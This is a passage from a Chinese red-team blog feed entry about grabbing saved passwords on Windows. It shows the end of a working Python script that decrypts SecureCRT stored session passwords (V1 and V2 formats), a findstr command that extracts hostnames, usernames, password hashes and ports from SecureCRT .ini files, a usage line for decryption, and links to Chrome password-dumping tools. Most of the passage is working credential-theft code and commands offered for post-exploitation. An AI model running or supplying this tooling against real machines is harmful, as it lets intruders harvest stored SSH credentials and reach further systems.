&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        ciphered_bytes = <span class="built_in">bytes</span>.fromhex(Ciphertext)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciphered_bytes) &lt;= <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        padded_plain_bytes = cipher2.decrypt(cipher1.decrypt(ciphered_bytes)[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_plain_bytes), <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> padded_plain_bytes[i] == <span class="number">0</span> <span class="keyword">and</span> padded_plain_bytes[i + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">0</span>:i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">raise</span>(ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureCRTCryptoV2</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ConfigPassphrase : <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCryptoV2 object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            ConfigPassphrase: The config passphrase that SecureCRT uses. Leave it empty if config passphrase is not set.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * AES.block_size</span><br><span class="line">        self.Key = SHA256.new(ConfigPassphrase.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) &gt; <span class="number">0xffffffff</span>:</span><br><span class="line">            <span class="keyword">raise</span> OverflowError(<span class="string">&#x27;Plaintext is too long.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        plain_bytes = \</span><br><span class="line">            <span class="built_in">len</span>(plain_bytes).to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            SHA256.new(plain_bytes).digest()</span><br><span class="line">        padded_plain_bytes = \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            os.urandom(AES.block_size - <span class="built_in">len</span>(plain_bytes) % AES.block_size)</span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher.encrypt(padded_plain_bytes).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        padded_plain_bytes = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(Ciphertext))</span><br><span class="line">        </span><br><span class="line">        plain_bytes_length = <span class="built_in">int</span>.from_bytes(padded_plain_bytes[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">4</span>:<span class="number">4</span> + plain_bytes_length]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) != plain_bytes_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        plain_bytes_digest = padded_plain_bytes[<span class="number">4</span> + plain_bytes_length:<span class="number">4</span> + plain_bytes_length + SHA256.digest_size]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes_digest) != SHA256.digest_size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> SHA256.new(plain_bytes).digest() != plain_bytes_digest:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Help</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    SecureCRTCipher.py &lt;enc|dec&gt; [-v2] [-p ConfigPassphrase] &lt;plaintext|ciphertext&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    &lt;enc|dec&gt;              &quot;enc&quot; for encryption, &quot;dec&quot; for decryption.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    [-v2]                  Encrypt/Decrypt with &quot;Password V2&quot; algorithm.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    [-p ConfigPassphrase]  The config passphrase that SecureCRT uses.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    &lt;plaintext|ciphertext&gt; Plaintext string or ciphertext string.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           NOTICE: Ciphertext string must be a hex string.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">EncryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCryptoV2(ConfigPassphrase).Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCrypto().Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error: Failed to encrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">DecryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCryptoV2(ConfigPassphrase).Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCrypto().Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error: Failed to decrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Main</span>(<span class="params">argc : <span class="built_in">int</span>, argv : <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">3</span> &lt;= argc <span class="keyword">and</span> argc &lt;= <span class="number">6</span>:</span><br><span class="line">            bUseV2 = <span class="literal">False</span></span><br><span class="line">            ConfigPassphrase = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;enc&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Help()</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; argc - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> argv[i].lower() == <span class="string">&#x27;-v2&#x27;</span>:</span><br><span class="line">                    bUseV2 = <span class="literal">True</span></span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> argv[i].lower() == <span class="string">&#x27;-p&#x27;</span> <span class="keyword">and</span> i + <span class="number">1</span> &lt; argc - <span class="number">1</span>:</span><br><span class="line">                    ConfigPassphrase = argv[i + <span class="number">1</span>]</span><br><span class="line">                    i += <span class="number">2</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    Help()</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bUseV2 == <span class="literal">False</span> <span class="keyword">and</span> <span class="built_in">len</span>(ConfigPassphrase) != <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Error: ConfigPassphrase is not supported if &quot;-v2&quot; is not specified&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bEncrypt:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> EncryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> DecryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Help()</span><br><span class="line"></span><br><span class="line">    exit(Main(<span class="built_in">len</span>(sys.argv), sys.argv))</span><br></pre></td></tr></table></figure><h4 id="8-X版本"><a href="#8-X版本" class="headerlink" title="8.X版本"></a>8.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /si /c:&quot;Hostname&quot; /c:&quot;\&quot;Username\&quot;=&quot; /c:&quot;\&quot;Password V2\&quot;=&quot; /c:&quot;\&quot;[SSH2] Port\&quot;=&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/23.png" alt="image-20210611163435588"></p><p>然后使用上面脚本解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注意去除hash的前面三位 &quot;02:&quot;</span><br><span class="line">python3  SecureCRT.py dec -v2 hash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/24.png" alt="image-20210611163621590"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://redteam.today/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/</span><br><span class="line">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81</span><br><span class="line">https://github.com/tianhe1986/FatSmallTools</span><br><span class="line">https://github.com/kinnisoy/GetChromePassword</span><br><span class="line">https://github.com/dzxs/Xdecrypt</span><br><span class="line">https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/</span><br><span class="line">https://www.cnblogs.com/Yang34/p/14237114.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="红蓝对抗" scheme="https://www.ascotbe.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="Windows" scheme="https://www.ascotbe.com/tags/Windows/"/>
    
    <category term="系统密码抓取" scheme="https://www.ascotbe.com/tags/%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    
    <category term="浏览器密码抓取" scheme="https://www.ascotbe.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    
    <category term="数据库密码抓取" scheme="https://www.ascotbe.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    
    <category term="SSH密码抓取" scheme="https://www.ascotbe.com/tags/SSH%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    
  </entry>
  
</feed>
